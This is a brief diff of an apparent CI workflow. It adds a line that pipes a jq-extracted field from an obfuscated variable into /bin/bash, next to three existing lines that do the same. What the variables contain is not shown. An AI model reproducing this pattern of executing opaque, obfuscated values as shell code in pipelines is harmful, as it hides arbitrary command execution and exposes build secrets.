@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$knw83733" | jq -r .p9990 | /bin/bash
           printf '%s' "$z5" | jq -r .seam81 | /bin/bash
           printf '%s' "$ngjf9382" | jq -r .niwa58 | /bin/bash
+          echo $z7 | jq -r .zeutv0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
